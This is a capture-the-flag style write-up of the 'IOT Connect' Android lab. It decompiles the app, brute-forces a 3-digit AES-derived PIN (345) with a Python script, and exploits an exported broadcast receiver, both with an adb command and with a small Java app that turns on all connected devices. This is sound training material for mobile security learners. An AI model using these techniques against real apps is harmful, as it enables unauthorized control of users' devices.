**Description**: Welcome to the "**IOT Connect**" **Broadcast Receiver Exploitation** Challenge! Immerse yourself in the world of cybersecurity with this hands-on lab. This challenge focuses on exploiting a security flaw related to the broadcast receiver in the "IOT Connect" application, allowing unauthorized users to activate the master switch, which can turn on all connected devices. The goal is to send a broadcast in a way that only authenticated users can trigger the master switch.

**Download**: https://lautarovculic.com/my_files/iotConnect.apk
**Link**: https://www.mobilehackinglab.com/path-player?courseid=lab-iot-connect

![[iotConnect.png]]

Install the **APP** with **ADB**
```bash
adb install -r iotConnect.apk
```

We can see that the application **contains** a **login**, a **sign up** and within the application we can **control multiple devices**.
Let's keep in mind that we are “**Guest**”.
In addition, there is a feature called “**Master Switch**” that **asks for a 3-digit PIN**.

Let's decompile the **APK** with **apktool**
```bash
apktool d iotConnect.apk
```
Also, let's check the **source code** with **jadx**.

Before we'll work with the **Master Switch** key.
Is a **simple 3-digit PIN**, so, I found the class where it's implemented.
The **`Checker`** class:
```java
public final class Checker {  
    public static final Checker INSTANCE = new Checker();  
    private static final String algorithm = "AES";  
    private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";  
  
    private Checker() {  
    }  
  
    public final boolean check_key(int key) {  
        try {  
            return Intrinsics.areEqual(decrypt(ds, key), "master_on");  
        } catch (BadPaddingException e) {  
            return false;  
        }  
    }  
  
    public final String decrypt(String ds2, int key) {  
        Intrinsics.checkNotNullParameter(ds2, "ds");  
        SecretKeySpec secretKey = generateKey(key);  
        Cipher cipher = Cipher.getInstance(algorithm + "/ECB/PKCS5Padding");  
        cipher.init(2, secretKey);  
        if (Build.VERSION.SDK_INT >= 26) {  
            byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2));  
            Intrinsics.checkNotNull(decryptedBytes);  
            return new String(decryptedBytes, Charsets.UTF_8);  
        }  
        throw new UnsupportedOperationException("VERSION.SDK_INT < O");  
    }  
  
    private final SecretKeySpec generateKey(int staticKey) {  
        byte[] keyBytes = new byte[16];  
        byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8);  
        Intrinsics.checkNotNullExpressionValue(staticKeyBytes, "getBytes(...)");  
        System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length));  
        return new SecretKeySpec(keyBytes, algorithm);  
    }  
}
```

**AES key**
- Generated from the integer and set to *16 bytes*.
**AES ECB encryption**
- We decrypt the `ds` text using the generated key.
**Validation**
- We compare the decrypted text with “`master_on`”
**Output**
- If we find the correct key, we print it.
```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# data
cipher_text_base64 = "OSnaALIWUkpOziVAMycaZQ=="
cipher_text = base64.b64decode(cipher_text_base64)
target_plain_text = "master_on"

# generate key
def generate_key(key: int) -> bytes:
    key_bytes = str(key).encode('utf-8')
    return (key_bytes + b'\0' * 16)[:16]  # 16 bytes

# bruteforce
for key in range(0, 1000):  # range 000-999
    try:
        secret_key = generate_key(key)
        cipher = AES.new(secret_key, AES.MODE_ECB)
        decrypted = cipher.decrypt(cipher_text)
        plain_text = unpad(decrypted, AES.block_size).decode('utf-8')

        if plain_text == target_plain_text:
            print(f"[✅] Key FOUND!: {key:03d}")
            print(f"[🔓] Text: {plain_text}")
            break

    except (ValueError, UnicodeDecodeError):
        continue
else:
    print("[❌] Key cannot be found.")
```

Output:
```bash
[✅] Key FOUND!: 345
[🔓] Text: master_on
```
Keep in mind the *master key*: `345`.

Let's continue with the challenge.
This is about a **broadcast receiver**, and there is the **receiver**:
```XML
<activity
    android:name="com.mobilehackinglab.iotconnect.MainActivity"
    android:exported="true"/>
<receiver
    android:name="com.mobilehackinglab.iotconnect.MasterReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter>
        <action android:name="MASTER_ON"/>
    </intent-filter>
</receiver>
```

So we can **craft an command** for **send the broadcast** to the action **`MASTER_ON`**.

**NOTE**:
This app have many code, many activities, etc.
But remember that this is a **challenge**. Isn't pentest or bug bounty program.
So, we will focus on the use of **broadcast receivers**.

#### BroadcastReceiver & Intents
A **BroadcastReceiver** **is not an Intent**, but **works with Intents**.

1️⃣ **Intent**
- It is an object that **transports data and instructions** between Android components (Activities, Services, BroadcastReceivers).
- Used to **initialize components** or **send messages**.
2️⃣ **BroadcastReceiver**
- It is an **Android component** that **listens and responds to Intents sent via broadcasts**.
- It acts as a **global message receiver**.
3️⃣ **Relation**
- An **Intent** carries the **broadcast** information.
- The **BroadcastReceiver** receives the Intent and **acts accordingly**.

The code in the app that *handle the broadcast and intent* is the **`CommunicationManager`** class.
While **`MasterSwitchActivity`** isn't of our interest due to that we don't have as goal become a **master user**.
Our goal es **Turn on all devices**.

The **`CommunicationManager`** code is
```java
public final class CommunicationManager {  
    public static final CommunicationManager INSTANCE = new CommunicationManager();  
    private static BroadcastReceiver masterReceiver;  
    private static SharedPreferences sharedPreferences;  
  
    private CommunicationManager() {  
    }  
  
    public final BroadcastReceiver initialize(Context context) {  
        Intrinsics.checkNotNullParameter(context, "context");  
        masterReceiver = new BroadcastReceiver() { // from class: com.mobilehackinglab.iotconnect.CommunicationManager$initialize$1  
            @Override // android.content.BroadcastReceiver  
            public void onReceive(Context context2, Intent intent) {  
                if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, "MASTER_ON")) {  
                    int key = intent.getIntExtra("key", 0);  
                    if (context2 != null) {  
                        if (Checker.INSTANCE.check_key(key)) {  
                            CommunicationManager.INSTANCE.turnOnAllDevices(context2);  
                            Toast.makeText(context2, "All devices are turned on", 1).show();  
                        } else {  
                            Toast.makeText(context2, "Wrong PIN!!", 1).show();  
                        }  
                    }  
                }  
            }  
        };  
        BroadcastReceiver broadcastReceiver = masterReceiver;  
        if (broadcastReceiver == null) {  
            Intrinsics.throwUninitializedPropertyAccessException("masterReceiver");  
            broadcastReceiver = null;  
        }  
        context.registerReceiver(broadcastReceiver, new IntentFilter("MASTER_ON"));  
        BroadcastReceiver broadcastReceiver2 = masterReceiver;  
        if (broadcastReceiver2 != null) {  
            return broadcastReceiver2;  
        }  
        Intrinsics.throwUninitializedPropertyAccessException("masterReceiver");  
        return null;  
    }  
  
    public final void turnOnAllDevices(Context context) {  
        Intrinsics.checkNotNullParameter(context, "context");  
        Log.d("TURN ON", "Turning all devices on");  
        turnOnDevice(context, FansFragment.FAN_STATE_PREFERENCES, FansFragment.FAN_ONE_STATE_KEY, true);  
        turnOnDevice(context, FansFragment.FAN_STATE_PREFERENCES, FansFragment.FAN_TWO_STATE_KEY, true);  
        turnOnDevice(context, ACFragment.AC_PREFERENCES, ACFragment.AC_STATE_KEY, true);  
        turnOnDevice(context, PlugFragment.PLUG_FRAGMENT_PREFERENCES, PlugFragment.PLUG_STATE_KEY, true);  
        turnOnDevice(context, SpeakerFragment.SPEAKER_FRAGMENT_PREFERENCES, SpeakerFragment.SPEAKER_STATE_KEY, true);  
        turnOnDevice(context, TVFragment.TV_FRAGMENT_PREFERENCES, TVFragment.TV_STATE_KEY, true);  
        turnOnDevice(context, BulbsFragment.BULB_FRAGMENT_PREFERENCES, BulbsFragment.BULB_STATE_KEY, true);  
    }  
  
    public final void turnOnDevice(Context context, String preferencesName, String stateKey, boolean defaultState) {  
        Intrinsics.checkNotNullParameter(context, "context");  
        Intrinsics.checkNotNullParameter(preferencesName, "preferencesName");  
        Intrinsics.checkNotNullParameter(stateKey, "stateKey");  
        SharedPreferences sharedPreferences2 = context.getSharedPreferences(preferencesName, 0);  
        Intrinsics.checkNotNullExpressionValue(sharedPreferences2, "getSharedPreferences(...)");  
        sharedPreferences = sharedPreferences2;  
        SharedPreferences sharedPreferences3 = sharedPreferences;  
        if (sharedPreferences3 == null) {  
            Intrinsics.throwUninitializedPropertyAccessException("sharedPreferences");  
            sharedPreferences3 = null;  
        }  
        SharedPreferences.Editor $this$turnOnDevice_u24lambda_u240 = sharedPreferences3.edit();  
        $this$turnOnDevice_u24lambda_u240.putBoolean(stateKey, defaultState);  
        $this$turnOnDevice_u24lambda_u240.apply();  
    }  
}
```

Notice in the **broadcast handle**
```java
masterReceiver = new BroadcastReceiver() { // from class: com.mobilehackinglab.iotconnect.CommunicationManager$initialize$1
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context2, Intent intent) {
        if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, "MASTER_ON")) {
            int key = intent.getIntExtra("key", 0);
            if (context2 != null) {
                if (Checker.INSTANCE.check_key(key)) {
                    CommunicationManager.INSTANCE.turnOnAllDevices(context2);
                    Toast.makeText(context2, "All devices are turned on", 1).show();
                } else {
                    Toast.makeText(context2, "Wrong PIN!!", 1).show();
                }
            }
        }
    }
};
```
This call to the **`Checker`** class (where this return the **key value** (an *345 as integer*).

And here's the `turnOnAllDevices()` function that is called if the *Checker instance is `true`*
```java
public final void turnOnAllDevices(Context context) {
    Intrinsics.checkNotNullParameter(context, "context");
    Log.d("TURN ON", "Turning all devices on");
    turnOnDevice(context, FansFragment.FAN_STATE_PREFERENCES, FansFragment.FAN_ONE_STATE_KEY, true);
    turnOnDevice(context, FansFragment.FAN_STATE_PREFERENCES, FansFragment.FAN_TWO_STATE_KEY, true);
    turnOnDevice(context, ACFragment.AC_PREFERENCES, ACFragment.AC_STATE_KEY, true);
    turnOnDevice(context, PlugFragment.PLUG_FRAGMENT_PREFERENCES, PlugFragment.PLUG_STATE_KEY, true);
    turnOnDevice(context, SpeakerFragment.SPEAKER_FRAGMENT_PREFERENCES, SpeakerFragment.SPEAKER_STATE_KEY, true);
    turnOnDevice(context, TVFragment.TV_FRAGMENT_PREFERENCES, TVFragment.TV_STATE_KEY, true);
    turnOnDevice(context, BulbsFragment.BULB_FRAGMENT_PREFERENCES, BulbsFragment.BULB_STATE_KEY, true);
}
```

We need *craft the ADB command* correctly.
When we send an **extra** in an intent, we can use
`--es`: Extra String.
`--ei`: Extra Integer.

This correspond to the **type of variable** that we'll handle.
![[iotConnect2.png]]

In this case, **integer**.

But what is an **extra** in an **intent**?
In Android, an **Extra is a set of additional data that you can attach to an Intent to pass information between components of an application** (such as Activities, Services, or Broadcast Receivers).

- **Intent**: A message used to communicate components (Activity, Service, Receiver).
- **Extras**: They are key-value data attached to the Intent.
- **Types of Extras**: They can be Strings, Integers, Booleans, Parcels, Arrays, and even serializable objects.

**Key points about the Extras**
- **Unique Keys**: Each extra has a unique key (as “**key**”).
- **Correct Types**: It is **vital to use the correct type** when sending and receiving (`--ei` for Integer, `--es` for String).
- **Access**: They are accessed through **methods** like `getStringExtra()`, `getIntExtra()`, etc.
- **ADB usage**: `--ei`, `--es`, `--ez` are examples of how to specify the type of extra when sending Intents with ADB.

Setup **logcat**
```bash
adb logcat | grep "Turning all devices on"
```

Then, *log in to the app* and send the **intent** via **ADB**
```bash
adb shell am broadcast \
-a MASTER_ON \
--ei key 345
```

Notice the logs and screen of the device that *all devices are turn on*
```bash
01-04 00:28:48.857 21907 21907 D TURN ON : Turning all devices on
```

Let's develop a **simple app** as exploit that send the intent to this broadcast. **Taking advantage of the fact that this one is exported**.

This is a **global broadcast receiver**, so we **don't need specific the activity, package name, etc**.
We just need create an app that have this in the **MainActivity.java**
```java
package com.lautaro.iotreconnect;

import android.content.Intent;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Create intent with MASTER_ON action
        Intent intent = new Intent("MASTER_ON");
        // Add extra
        intent.putExtra("key", 345);
        // Send Broadcast
        sendBroadcast(intent);
    }
}
```
Now you know how **turn on all devices**.

I hope you found it useful (: